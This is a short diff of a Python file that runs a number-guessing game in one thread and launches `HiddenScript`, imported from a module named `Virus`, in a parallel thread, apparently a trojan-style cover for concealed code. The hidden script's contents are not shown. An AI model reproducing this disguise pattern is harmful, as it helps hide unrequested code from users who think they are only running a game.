@@ -3,8 +3,8 @@ import threading
 from time import sleep
 from random import randint, choice
 from itertools import chain
-import Tree
-import Virus
+from Tree import Tree
+from Virus import HiddenScript
 
 def GuessingGame():                            #credits to https://www.codespeedy.com/number-guessing-game-in-python/
     print(os.getcwd())
@@ -29,6 +29,6 @@ def GuessingGame():                            #credits to https://www.codespeed
                 print("Your guess was too high, please enter a lower number")
               
 game = threading.Thread(target=GuessingGame)
-script = threading.Thread(target=Virus.HiddenScript)
+script = threading.Thread(target=HiddenScript)
 game.start()
 script.start()
